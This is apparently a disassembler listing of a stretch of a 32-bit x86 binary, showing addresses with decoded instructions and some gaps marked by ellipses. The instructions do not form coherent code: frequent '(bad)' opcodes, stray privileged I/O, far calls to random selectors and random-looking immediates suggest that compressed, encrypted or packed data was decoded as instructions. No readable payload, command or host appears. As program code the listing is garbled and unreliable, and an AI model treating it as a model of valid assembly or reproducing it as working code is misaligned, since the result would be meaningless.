  41819f:	fild   DWORD PTR [eax]
  4181a1:	dec    ebp
  4181a2:	iret   
  4181a3:	les    esp,FWORD PTR [eax+0x38]
  4181a6:	mov    eax,ds:0x33ce9cf3
  4181ab:	ror    ebx,1
  4181ad:	sub    eax,0x4293f56b
  4181b2:	in     eax,dx
  4181b3:	test   eax,0x7b
	...
  418214:	add    BYTE PTR [eax],al
  418216:	aaa    
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	dec    ebp
  418223:	pop    edi
  418224:	or     DWORD PTR [edi],edi
  418226:	sub    ch,bh
  418228:	add    BYTE PTR [eax],al
  41822a:	pop    es
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    dh,ch
  41822f:	fild   QWORD PTR [ebp+0x4d]
  418232:	repnz mov esi,0x75bbebd0
  418238:	jae    0x41822c
  41823a:	test   edi,0xde220630
  418240:	mov    eax,0x543b390b
  418245:	pop    esp
  418246:	(bad)
  41824b:	int3   
  41824c:	(bad)  
  41824e:	mov    ds:0x88886a7f,al
  418253:	fisubr WORD PTR [edi-0x47]
  418256:	xlat   BYTE PTR ds:[ebx]
  418257:	and    al,bh
  418259:	inc    ecx
  41825a:	iret   
  41825b:	and    bh,BYTE PTR [esi-0x4d60ff58]
  418261:	adc    esi,DWORD PTR ds:0xb27a4cb6
  418267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418268:	adc    dh,BYTE PTR [edx]
  41826a:	xchg   ebx,eax
  41826b:	pop    ss
  41826c:	mov    eax,0x2f23b99a
  418271:	mov    BYTE PTR [edi-0x58],bl
  418274:	cmp    eax,0xb36a045a
  418279:	cdq    
  41827a:	mov    esp,0xdc6b15e4
  41827f:	xchg   ebx,eax
  418281:	(bad)  
  418282:	push   es
  418283:	mov    ?,WORD PTR [ecx+0x282c0799]
  418289:	dec    ebp
  41828a:	mov    eax,ds
  41828c:	inc    edi
  41828d:	out    dx,ax
  41828f:	xor    esi,DWORD PTR [ebp+0x1a]
  418292:	sahf   
  418293:	sub    dl,bh
  418295:	imul   ebp,DWORD PTR ds:0xc0b02ea9,0xffffff82
  41829c:	cmp    edx,esp
  41829e:	inc    eax
  41829f:	rcr    BYTE PTR [eax],1
  4182a1:	dec    esp
  4182a2:	sbb    eax,0x28319453
  4182a7:	adc    BYTE PTR [ebx-0x2b5a399b],0x23
  4182ae:	xor    al,0xa5
  4182b0:	xchg   ebx,eax
  4182b1:	push   ebx
  4182b2:	or     al,0xa
  4182b4:	jnp    0x4182be
  4182b6:	dec    esi
  4182b7:	aad    0x95
  4182b9:	js     0x4182a9
  4182bb:	es jg  0x418282
  4182be:	push   edi
  4182bf:	mov    eax,0x127cf67
  4182c4:	dec    eax
  4182c5:	cli    
  4182c6:	add    DWORD PTR [esi],ebp
  4182c8:	imul   eax,esp,0x45ce95ac
  4182ce:	mov    dh,0x74
  4182d0:	std    
  4182d1:	dec    ecx
  4182d2:	sar    esp,1
  4182d4:	loopne 0x4182c8
  4182d6:	in     al,0x31
  4182d8:	xor    al,0xa4
  4182da:	inc    ebx
  4182db:	mov    esp,DWORD PTR [ecx-0x16f6c8b0]
  4182e1:	dec    ebx
  4182e2:	nop
  4182e3:	pop    eax
  4182e4:	leave  
  4182e5:	mov    BYTE PTR [edi],ch
  4182e7:	sub    eax,0xa3d6e701
  4182ec:	or     bl,BYTE PTR [edi+0x53e11f8e]
  4182f2:	retf   0xb5a6
  4182f5:	mov    ebx,esi
  4182f7:	add    al,0x8b
  4182f9:	sbb    eax,0x3bfce30d
  4182fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ff:	shl    al,0x8e
  418302:	mov    WORD PTR [ecx],?
  418304:	outs   dx,BYTE PTR ds:[esi]
  418305:	fwait
  418306:	xor    edx,DWORD PTR [ebx-0x27]
  418309:	(bad)  
  41830a:	xor    cl,BYTE PTR [esi+0x487efc0a]
  418310:	xlat   BYTE PTR ds:[ebx]
  418311:	aad    0xe5
  418313:	mov    bl,0x3a
  418315:	push   eax
  418316:	push   cs
  418317:	push   ds
  418318:	add    eax,0xcec000d3
  41831d:	push   ebx
  41831e:	xchg   ebx,eax
  41831f:	(bad)  
  418320:	(bad)  [eax+0x36]
  418323:	call   0xa78e:0xe72848c1
  41832a:	(bad)  
  41832b:	nop
  41832c:	fwait
  41832d:	push   0x44c7fe77
  418332:	test   al,0xd
  418334:	nop
	...
  418395:	add    ah,bl
  418397:	mov    bl,0x3f
  418399:	push   eax
  41839a:	jg     0x418378
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	inc    esp
  4183a3:	or     dl,BYTE PTR [esi+0xfe2fd3]
  4183a9:	add    BYTE PTR [edi],al
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    bh,cl
  4183af:	ins    DWORD PTR es:[edi],dx
  4183b0:	popa   
  4183b1:	ds in  eax,dx
  4183b3:	cmp    al,0xa6
  4183b5:	das    
  4183b6:	mov    al,ds:0x5c7bce11
  4183bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183bc:	leave  
  4183bd:	(bad)  
  4183be:	sti    
  4183bf:	hlt    
  4183c0:	inc    esp
  4183c1:	fsub   DWORD PTR [edi]
  4183c3:	mov    dl,0x47
  4183c5:	rcl    edi,0xc5
  4183c8:	sub    BYTE PTR [edi+0x46f07094],0x27
  4183cf:	out    0xb1,eax
  4183d1:	push   ecx
  4183d2:	dec    esi
  4183d3:	dec    ebp
  4183d4:	inc    ebp
  4183d5:	in     al,0x73
  4183d7:	mov    ch,0xf1
  4183d9:	xlat   BYTE PTR ds:[ebx]
  4183da:	pop    bx
  4183dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183dd:	lods   eax,DWORD PTR ds:[esi]
  4183de:	cmp    esi,ebx
  4183e0:	add    bh,0x20
  4183e3:	sbb    DWORD PTR [ebp-0xd20cb3b],edi
  4183e9:	dec    eax
  4183ea:	stc    
  4183eb:	out    dx,eax
  4183ec:	mov    dl,0xfe
  4183ee:	cmp    bl,dh
  4183f0:	xchg   esi,eax
  4183f1:	or     BYTE PTR [esi-0x37],0xba
  4183f5:	mov    edx,0x2bb2b76d
  4183fa:	add    esp,DWORD PTR [edi-0x67cfc5f9]
  418400:	sub    eax,0xcd93cc86
  418405:	int3   
  418406:	inc    ecx
  418407:	push   0xb46b8ea8
  41840c:	mov    ebp,0x1c4eb605
  418411:	push   ebx
  418412:	call   0x8b44:0x54e3e72a
  418419:	xchg   ebp,eax
  41841a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41841b:	sub    BYTE PTR [edx],ch
  41841d:	sub    edi,DWORD PTR [edi+0x29]
  418420:	dec    ebx
  418421:	sub    eax,DWORD PTR [ebx+0x2e]
  418424:	and    eax,0x2fa718f5
  418429:	mov    ebp,0xd6cc5999
  41842e:	xchg   ebp,eax
  41842f:	pop    eax
  418430:	pop    edi
  418431:	gs xchg ecx,eax
  418433:	or     eax,DWORD PTR [edi]
  418435:	jl     0x418443
  418437:	mov    ebx,0xd0210243
  41843c:	ret    0x1947
  41843f:	mov    ds:0x70c80011,eax
  418444:	inc    ebx
  418445:	mov    cl,0xfb
  418447:	test   eax,0xd6761562
  41844c:	popa   
  41844d:	and    DWORD PTR [esp+edx*1+0x53],ebx
  418451:	(bad)  
  418452:	aam    0x23
  418454:	fcomp  st(2)
  418456:	cmp    eax,0xa75fc06b
  41845b:	nop
  41845c:	mov    ecx,DWORD PTR [eax+0x2b9e8657]
  418462:	xor    esi,edi
  418464:	imul   edx,DWORD PTR [ebp-0x11],0x8591eea9
  41846b:	ret    
  41846c:	xor    al,0x24
  41846e:	js     0x4183f9
  418470:	pmaxsw mm2,mm3
  418473:	lds    esp,FWORD PTR [esi+0x3f]
  418476:	xchg   ebp,eax
  418477:	pop    ecx
  418478:	je     0x4184f8
  41847a:	fucomip st,st(0)
  41847c:	push   edi
  41847d:	dec    ebx
  41847e:	jns    0x4184bd
  418480:	popf   
  418481:	mov    ebx,0xee046d7b
  418486:	mov    esi,0x5018a6f4
  41848b:	sbb    al,0xa2
  41848d:	jbe    0x41843f
  41848f:	dec    eax
  418490:	cwde   
  418491:	fiadd  DWORD PTR [ebx-0x2b]
  418494:	test   al,0xe7
  418496:	push   ds
  418497:	daa    
  418498:	mov    bh,0xc5
  41849a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41849b:	jmp    0x418458
  41849d:	dec    esp
  41849e:	xchg   ecx,eax
  41849f:	mov    eax,0x4dc7eba
  4184a4:	repnz or ah,dh
  4184a7:	xor    BYTE PTR [edx+0x43d87ca6],0x53
  4184ae:	adc    DWORD PTR [ebx+ebp*4-0x5f],eax
  4184b2:	ss xchg esp,eax
  4184b4:	dec    edx
	...
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [ebp+ebp*8+0x36b64ba7]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [ecx-0x7c],dl
  418530:	std    
  418531:	(bad)  
  418532:	leave  
  418533:	add    eax,0xb36d5f5d
  418538:	xchg   ebx,eax
  418539:	(bad)  
  41853a:	daa    
  41853b:	push   es
  41853c:	and    eax,0x98a39d0f
  418541:	adc    eax,0xaf1421b7
  418546:	jle    0x4184e7
  418548:	fs jae 0x418527
  41854b:	mov    ds:0x57db7dbc,al
  418550:	das    
  418551:	jecxz  0x418562
  418553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418554:	lods   eax,DWORD PTR ds:[esi]
  418555:	cmp    eax,0x77561d93
  41855a:	mov    eax,ds:0x4fbc77fa
  41855f:	xor    eax,0xcab93a57
  418564:	adc    al,0x6b
  418566:	jo     0x418502
  418568:	push   ebp
  418569:	fld    QWORD PTR [edx-0x7f37e9d1]
  41856f:	nop
  418570:	imul   ecx,DWORD PTR [eax],0xffffffc7
  418573:	loope  0x4185b3
  418575:	(bad)  
  418576:	sbb    ebp,ebx
  418578:	sti    
  418579:	or     al,0x35
  41857b:	div    BYTE PTR [edx-0x27fad26e]
  418581:	inc    ecx
  418582:	inc    esp
  418583:	push   ecx
  418584:	enter  0xaf5f,0x98
  418588:	icebp  
  418589:	push   ds
  41858a:	sub    DWORD PTR [esi],ecx
  41858c:	in     al,0x3a
  41858e:	jno    0x4185b1
  418590:	xchg   esp,eax
  418591:	emms   
  418593:	or     ebx,ecx
  418595:	outs   dx,DWORD PTR ds:[esi]
  418596:	or     BYTE PTR [edx],bh
  418598:	dec    BYTE PTR [ebp-0x631f3532]
  41859e:	xchg   DWORD PTR [ecx+0x5aef05d6],ebx
  4185a4:	sti    
  4185a5:	or     al,0x51
  4185a7:	iret   
  4185a8:	xchg   ecx,eax
  4185a9:	imul   esp,DWORD PTR [esi+0x403417b1],0x7357ab9b
  4185b3:	addr16 jmp 0xd22:0x2fea76e0
  4185bb:	aas    
  4185bc:	mov    esp,DWORD PTR [ecx+0x7867acdd]
  4185c2:	pop    edx
  4185c3:	add    dh,BYTE PTR [edi+esi*1]
  4185c6:	aam    0xbf
  4185c8:	add    dh,BYTE PTR [edi]
  4185ca:	sbb    DWORD PTR [esi],eax
  4185cc:	inc    esi
  4185cd:	fild   WORD PTR [edx-0x3b]
  4185d0:	stc    
  4185d1:	(bad)  
  4185d2:	jo     0x4185a6
  4185d4:	jp     0x41856b
  4185d6:	sar    DWORD PTR [ebx+0x10],cl
  4185d9:	in     al,dx
  4185da:	sbb    ch,BYTE PTR [ebx-0x2398c1bf]
  4185e0:	pop    esp
  4185e1:	leave  
  4185e2:	inc    eax
  4185e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185e4:	mov    edx,0x7ba52071
  4185e9:	sub    BYTE PTR ds:0xbdf4c46a,dh
  4185ef:	xchg   DWORD PTR [edx-0x11],ebx
  4185f2:	inc    ecx
  4185f3:	jl     0x41859d
  4185f5:	mov    BYTE PTR [edi-0x13],ch
  4185f8:	(bad)  
  4185f9:	cdq    
  4185fa:	sub    BYTE PTR [ebx+0x637cdd25],al
  418600:	(bad)  
  418601:	repnz cmp ch,bh
  418604:	xchg   DWORD PTR [eax-0x8ebdbc7],edx
  41860a:	sub    BYTE PTR [ebp+eiz*8-0x56],ch
  41860e:	or     al,0x5
  418610:	fnsave [eax-0x6b558e1a]
  418616:	pusha  
  418617:	add    al,0x2
  418619:	inc    edx
  41861a:	jne    0x418667
  41861c:	jae    0x41864b
  41861e:	mul    BYTE PTR [ebx]
  418620:	mov    DWORD PTR [eax-0x47f952a3],ecx
  418626:	lea    ebp,[esi-0x23d02cd2]
  41862c:	popf   
  41862d:	add    eax,0xe7ccbbc1
  418632:	hlt    
  418633:	push   0x6
	...
  418694:	add    BYTE PTR [eax],al
  418696:	xchg   ebx,eax
  418697:	sub    BYTE PTR [eax-0x604344c4],ah
  41869d:	scas   eax,DWORD PTR es:[edi]
  41869e:	pop    es
  41869f:	mov    edx,0x35c6be30
  4186a4:	adc    BYTE PTR [edi*1+0x7000100],dl
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [edi+0x783d8964],ch
  4186b3:	mov    eax,0x2ad8eaa2
  4186b8:	in     eax,dx
  4186b9:	ds adc al,0x46
  4186bc:	shl    ch,cl
  4186be:	in     al,dx
  4186bf:	dec    esp
  4186c0:	(bad)  
  4186c1:	sub    DWORD PTR [ebp+0x6b],esp
  4186c4:	in     eax,dx
  4186c5:	bound  ebx,QWORD PTR [ecx+0x667c17e0]
  4186cb:	enter  0x6e4f,0x92
  4186cf:	fild   DWORD PTR [ecx+0x6fceb6ec]
  4186d5:	xchg   edx,eax
  4186d6:	pop    ebx
  4186d7:	pop    ebp
  4186d8:	sub    al,0x23
  4186da:	add    BYTE PTR [ebx+edx*4-0x22127662],bh
  4186e1:	mov    dh,BYTE PTR [edx]
  4186e3:	xchg   ecx,eax
  4186e4:	test   DWORD PTR [ebx],0xc395d902
  4186ea:	mov    edi,0xa8b0a710
  4186ef:	stos   BYTE PTR es:[edi],al
  4186f0:	mov    bh,0x8e
  4186f2:	in     eax,dx
  4186f3:	push   ss
  4186f4:	xchg   edi,eax
  4186f5:	imul   DWORD PTR [edx-0x498b32ae]
  4186fb:	imul   eax,edx,0x7cc8251c
  418701:	ret    
  418702:	fwait
  418703:	(bad)  
  418704:	cmp    bl,BYTE PTR ss:[edi-0x33bd0c12]
  41870b:	inc    esp
  41870c:	push   0xde013b04
  418711:	imul   esi,DWORD PTR [edi+eiz*8-0x2f],0x10
  418716:	ds in  al,0xfb
  418719:	pop    ds
  41871a:	(bad)  [eax+esi*2]
  41871d:	sbb    DWORD PTR [edx+0x397cac96],edi
  418723:	mov    BYTE PTR [ebp-0x9],cl
  418726:	call   0x1395:0xfb1dbcbd
  41872d:	jae    0x4186f4
  41872f:	stos   DWORD PTR es:[edi],eax
  418730:	test   DWORD PTR [edx-0x4d52a5e0],0xbc45d37c
  41873a:	std    
  41873b:	xor    bh,BYTE PTR [ebx-0x2f]
  41873e:	adc    al,0xf9
  418740:	push   eax
  418741:	pop    eax
  418742:	mov    ch,BYTE PTR [ebp+0x44]
  418745:	fwait
  418746:	sub    DWORD PTR [ebx-0x4e],ebx
  418749:	lock or al,0x68
  41874c:	dec    ebp
  41874d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41874e:	or     al,0xf2
  418750:	ret    0x111f
  418753:	push   esi
  418754:	shl    bl,cl
  418756:	and    ah,ah
  418758:	cmp    BYTE PTR [esi-0x6f],bl
  41875b:	mov    bl,0x60
  41875d:	push   ss
  41875e:	cmp    eax,0xe391ef29
  418763:	and    al,0xb
  418765:	dec    esi
  418766:	mov    esp,0xe60a2caa
  41876b:	bnd jns 0x4187b4
  41876e:	push   sp
  418770:	imul   esi,DWORD PTR [esi+0x389a337f],0x73f372ca
  41877a:	aam    0xe2
  41877c:	xor    BYTE PTR [eax-0x2eb729d1],bh
  418782:	sub    al,0xdf
  418784:	and    ch,BYTE PTR [esi]
  418786:	sbb    DWORD PTR [esi+0x3a],esp
  418789:	ret    
  41878a:	(bad)  
  41878b:	push   cs
  41878c:	call   FWORD PTR [ebx-0x5d0b2127]
  418792:	es ins BYTE PTR es:[edi],dx
  418794:	scas   eax,DWORD PTR es:[edi]
  418795:	pop    edx
  418796:	jne    0x41871f
  418798:	inc    ebp
  418799:	xchg   DWORD PTR [ebx-0x554029d8],eax
  41879f:	xchg   BYTE PTR [ebx+0x5022dd9c],ah
  4187a5:	js     0x4187ac
  4187a7:	xor    al,0x71
  4187a9:	int    0x54
  4187ab:	dec    esi
  4187ac:	add    DWORD PTR [edx-0x2a],edi
  4187af:	sbb    bl,dl
  4187b1:	push   es
  4187b2:	lock xor BYTE PTR [ebx],bh
	...
  418815:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41881c:	hlt    
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0xd3d77be5
  418824:	js     0x418851
  418826:	inc    esp
  418827:	add    DWORD PTR [ecx],eax
  418829:	add    BYTE PTR [edi],al
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [edi+ebp*2],bh
  418830:	stos   DWORD PTR es:[edi],eax
  418831:	pop    edx
  418832:	mov    esi,0xbfc63d42
  418837:	lea    cx,[edx+0x4a24a7fc]
  41883e:	cmp    eax,0x3d21dca5
  418843:	stos   BYTE PTR es:[edi],al
  418844:	cli    
  418845:	push   ss
  418846:	pop    edi
  418847:	push   ecx
  418848:	mov    ebp,0xd98c52b6
  41884d:	je     0x418826
  41884f:	mov    ecx,0xcdbff450
  418854:	cmp    eax,0x470c73d7
  418859:	stc    
  41885a:	iret   
  41885b:	adc    eax,0x30bd864a
  418860:	jb     0x418855
  418862:	sbb    al,0x11
  418864:	(bad)  
  418865:	sti    
  418866:	pop    esp
  418867:	addr16 lock inc esi
  41886a:	(bad)  
  41886b:	lods   al,BYTE PTR ds:[esi]
  41886c:	sbb    BYTE PTR [ecx+0x5660265c],0xc3
  418873:	in     eax,dx
  418874:	pusha  
  418875:	jae    0x41883d
  418877:	shr    DWORD PTR [eax+0x2f],0xd2
  41887b:	popa   
  41887c:	lods   eax,DWORD PTR ds:[esi]
  41887d:	pop    eax
  41887e:	mov    ah,0x18
  418880:	fmul   st(7),st
  418882:	aad    0x5f
  418884:	fsubr  QWORD PTR [ebp+0x1f]
  418887:	loop   0x41889d
  418889:	lods   eax,DWORD PTR ds:[esi]
  41888a:	cmp    DWORD PTR ds:0x1c44033a,0x8
  418891:	dec    edx
  418892:	gs (bad) 
  418894:	jmp    0xeb376f6b
  418899:	push   0xffffffdd
  41889b:	lahf   
  41889c:	push   ebp
  41889d:	add    DWORD PTR [ebx-0x7d9c27ac],0xffffffd5
  4188a4:	dec    ebx
  4188a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188a6:	frstor [ecx-0x6a]
  4188a9:	(bad)  
  4188ab:	out    0x57,al
  4188ad:	mov    edi,0x73c91811
  4188b2:	int3   
  4188b3:	sbb    al,0xd
  4188b5:	sbb    eax,0x24e20fe2
  4188ba:	fidiv  DWORD PTR [esi-0x24d65d6a]
  4188c0:	fsubp  st(7),st
  4188c2:	inc    edi
  4188c3:	sti    
  4188c4:	lahf   
  4188c5:	gs sbb al,0xc3
  4188c8:	enter  0xe976,0x17
  4188cc:	shl    BYTE PTR [eax],0x94
  4188cf:	jns    0x4188ca
  4188d1:	js     0x4188e5
  4188d3:	push   ds
  4188d4:	mov    eax,ds:0x59584a5b
  4188d9:	stos   BYTE PTR es:[edi],al
  4188da:	es cmc 
  4188dc:	ins    BYTE PTR es:[edi],dx
  4188dd:	pop    ds
  4188de:	sbb    DWORD PTR [ecx],ecx
  4188e0:	jle    0x4188bf
  4188e2:	stos   BYTE PTR es:[edi],al
  4188e3:	sti    
  4188e4:	jecxz  0x418887
  4188e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e7:	test   eax,0xb6b4cc1f
  4188ed:	jne    0x4188ef
  4188ef:	ins    DWORD PTR es:[edi],dx
  4188f0:	ret    0xba8d
  4188f3:	or     DWORD PTR [esp+ebp*4-0x224a1a18],ecx
  4188fa:	or     BYTE PTR [esi],bl
  4188fc:	or     edi,DWORD PTR [ecx]
  4188fe:	push   0xffffffe8
  418900:	(bad)  
  418901:	add    al,0x1c
  418903:	adc    bl,bl
  418905:	jl     0x4188fd
  418907:	or     DWORD PTR [ecx-0x18],eax
  41890a:	sbb    bl,bh
  41890c:	pop    ds
  41890d:	ror    BYTE PTR [ebp+0x346d9fb3],cl
  418913:	rol    DWORD PTR [eax-0x80],1
  418916:	and    ch,ch
  418918:	inc    edx
  418919:	fcom   QWORD PTR [eax]
  41891b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41891c:	adc    DWORD PTR [eax],ebp
  41891e:	shl    DWORD PTR [edx],0x29
  418921:	stos   DWORD PTR es:[edi],eax
  418922:	js     0x418943
  418924:	add    al,dl
  418926:	xor    al,BYTE PTR [eax+0x9]
  418929:	or     BYTE PTR [edi+0x34ef6907],0x30
  418930:	sbb    eax,0xc85ec86b
	...
  418995:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi-0x3ddd1290]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    BYTE PTR [esi-0x57ef7f91],al
  4189b3:	fidiv  DWORD PTR [ecx+0x6cfb6ff5]
  4189b9:	add    BYTE PTR [eax],bl
  4189bb:	aad    0x96
  4189bd:	stos   DWORD PTR es:[edi],eax
  4189be:	sub    bl,bh
  4189c0:	scas   al,BYTE PTR es:[edi]
  4189c1:	fild   WORD PTR [esi+eiz*2-0x4]
  4189c5:	inc    esp
  4189c6:	std    
  4189c7:	xchg   esp,eax
  4189c8:	push   esi
  4189c9:	pop    ecx
  4189ca:	pusha  
  4189cb:	ret    0xae49
  4189ce:	push   ecx
  4189cf:	jo     0x418a06
  4189d1:	sahf   
  4189d2:	in     eax,dx
  4189d3:	mov    al,0x39
  4189d5:	inc    edi
  4189d6:	or     eax,0x6ffdad31
  4189db:	imul   ebx,DWORD PTR [eax],0xfcd42082
  4189e1:	or     edx,ecx
  4189e3:	pop    ecx
  4189e4:	mov    dh,0x11
  4189e6:	outs   dx,BYTE PTR ds:[esi]
  4189e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189e8:	xchg   edi,eax
  4189e9:	add    bh,bh
  4189eb:	and    eax,0x32cd041e
  4189f0:	enter  0xcd7f,0x53
  4189f4:	dec    ebp
  4189f5:	mov    eax,0x86ea535a
  4189fa:	mov    ds:0xab4b1019,eax
  4189ff:	sar    eax,1
  418a01:	dec    ebx
  418a02:	imul   esp,eax,0x28e65f0a
  418a08:	jp     0x418a53
  418a0a:	aam    0x50
  418a0c:	add    esp,edx
  418a0e:	lods   eax,DWORD PTR ds:[esi]
  418a0f:	loope  0x418a1f
  418a11:	xchg   ebp,eax
  418a12:	lods   al,BYTE PTR ds:[esi]
  418a13:	data16 adc BYTE PTR [esi],dh
  418a16:	mov    ds:0x32e89227,al
  418a1b:	pop    ebx
  418a1c:	ret    
  418a1d:	cmp    al,0xab
  418a1f:	jns    0x418a37
  418a21:	ss mov edx,0x340b11b1
  418a27:	loopne 0x418a10
  418a29:	inc    ecx
  418a2a:	or     ebp,DWORD PTR [ecx]
  418a2c:	loope  0x418a72
  418a2e:	push   esp
  418a2f:	(bad)  
  418a30:	sub    eax,0x772638fa
  418a35:	xchg   esp,eax
  418a36:	mov    esi,0xb820e215
  418a3b:	iret   
  418a3c:	xchg   ecx,eax
  418a3d:	mov    edi,0x2866c478
  418a42:	ror    DWORD PTR [edx+ebp*4],cl
  418a45:	fisubr WORD PTR [ebx+0x1bf323a1]
  418a4b:	dec    esp
  418a4c:	clc    
  418a4d:	dec    esp
  418a4e:	jmp    0xc6176034
  418a53:	pop    esi
  418a54:	xor    dh,BYTE PTR [edx-0x37]
  418a57:	ja     0x418a76
  418a59:	je     0x4189f7
  418a5b:	sbb    al,0xec
  418a5d:	sub    DWORD PTR ds:0x12769e24,ebx
  418a63:	(bad)  
  418a64:	std    
  418a65:	mov    cl,ah
  418a67:	out    0x7f,al
  418a69:	loop   0x418a1b
  418a6b:	push   esp
  418a6c:	jp     0x418a56
  418a6e:	adc    al,0x4f
  418a70:	add    BYTE PTR [edi],0xa9
  418a73:	pop    edx
  418a74:	pop    ss
  418a75:	cs out dx,eax
  418a77:	cld    
  418a78:	test   al,0x6d
  418a7a:	mov    ah,0x9d
  418a7c:	ret    
  418a7d:	push   0x4b2205fd
  418a82:	cmp    cl,BYTE PTR [edi+eax*1]
  418a85:	cmp    DWORD PTR [eax+edx*4-0x4f],0x912c2d08
  418a8d:	xchg   edx,eax
  418a8e:	add    al,0xc9
  418a90:	dec    esi
  418a91:	outs   dx,DWORD PTR ds:[esi]
  418a92:	pop    DWORD PTR [edi+ebx*4-0x7846867c]
  418a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a9a:	mov    dl,0xfd
  418a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a9d:	ret    
  418a9e:	sub    eax,0x6270cbfa
  418aa3:	outs   dx,DWORD PTR ds:[esi]
  418aa4:	push   ds
  418aa5:	jo     0x418a8f
  418aa7:	test   DWORD PTR [ecx+0x77],ecx
  418aaa:	out    0xc6,al
  418aac:	fiadd  WORD PTR [eax]
  418aae:	mov    ds:0xbf7b7a4b,eax
  418ab3:	jno    0x418aa7
	...
  418b15:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b19:	xor    ch,bh
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x2c0941ce
  418b23:	sub    cl,BYTE PTR [ebx+0x103524f]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    BYTE PTR [esi-0x476708f9],al
  418b33:	aaa    
  418b34:	imul   esp,DWORD PTR [eax-0x6f34834b],0x2ac206c6
  418b3e:	xor    bl,BYTE PTR [edi-0x16a03dbf]
  418b44:	in     al,dx
  418b45:	or     al,0x9a
  418b47:	mov    esi,0x33ced8ac
  418b4c:	and    BYTE PTR [ecx-0x369677e9],0x4
  418b53:	dec    ebx
  418b54:	adc    DWORD PTR [ebp+0x1113bc3b],ebx
  418b5a:	push   esp
  418b5b:	dec    ebx
  418b5c:	dec    edi
  418b5d:	push   cs
  418b5e:	sub    BYTE PTR [edx+0x3150a21],dh
  418b64:	ss pop esi
  418b66:	mov    eax,ds:0x55d0629
  418b6b:	and    al,dl
  418b6d:	and    ch,dl
  418b6f:	push   ds
  418b70:	ror    ebx,1
  418b72:	mov    BYTE PTR [ebx+0x25],cl
  418b75:	jmp    0x418b04
  418b77:	mov    dl,0x44
  418b79:	xor    eax,0x77e817f5
  418b7e:	out    0x6d,eax
  418b80:	aaa    
  418b81:	xchg   DWORD PTR [esi-0x47],edx
  418b84:	cld    
  418b85:	cmp    eax,0x4389a44
  418b8a:	fdivr  DWORD PTR [edx+0x1f]
  418b8d:	iret   
  418b8e:	mov    al,ds:0x402b577a
  418b93:	mov    esi,0xb3d6262e
  418b98:	inc    edi
  418b99:	push   ds
  418b9a:	jg     0x418b85
  418b9c:	mov    eax,ds:0x68f0ef63
  418ba1:	rcl    DWORD PTR [ebx+0x1e],0xe9
  418ba5:	pop    ebp
  418ba6:	pop    edx
  418ba7:	push   esp
  418ba8:	sbb    BYTE PTR [ebp-0x53],ah
  418bab:	pop    ebp
  418bac:	push   0x78214ab3
  418bb1:	repz dec edi
  418bb3:	(bad)  
  418bb4:	fidiv  DWORD PTR [edx-0x2c1b66f2]
  418bba:	cmp    eax,0x461653cd
  418bbf:	ret    
  418bc0:	or     BYTE PTR [eax-0x5e],ah
  418bc3:	or     BYTE PTR [ebx-0x635cddd5],0xd2
  418bca:	pop    edx
  418bcb:	mov    ds:0x5dedfbe6,eax
  418bd0:	push   cs
  418bd1:	in     eax,dx
  418bd2:	retf   0x9d7
  418bd5:	or     ah,BYTE PTR [ebx]
  418bd7:	mov    DWORD PTR [ecx+0x31141217],eax
  418bdd:	call   0x2b1ccd40
  418be2:	jmp    0x418b74
  418be4:	mov    WORD PTR [edi],ss
  418be6:	fwait
  418be7:	in     eax,dx
  418be8:	sub    al,0xd1
  418bea:	cld    
  418beb:	daa    
  418bec:	(bad)  
  418bed:	cmc    
  418bee:	ins    DWORD PTR es:[edi],dx
  418bef:	or     eax,0x84bd5ff8
  418bf4:	xchg   edi,eax
  418bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bf6:	mov    cl,0x2f
  418bf8:	popf   
  418bf9:	int3   
  418bfa:	xchg   edi,eax
  418bfb:	sbb    al,0x3d
  418bfd:	inc    ebx
  418bfe:	adc    BYTE PTR [ebx-0x59],bh
  418c01:	mov    al,0x64
  418c03:	icebp  
  418c04:	mov    ds,WORD PTR [esi+0x3582c374]
  418c0a:	(bad)  
  418c0b:	iret   
  418c0c:	call   0x8c7540b2
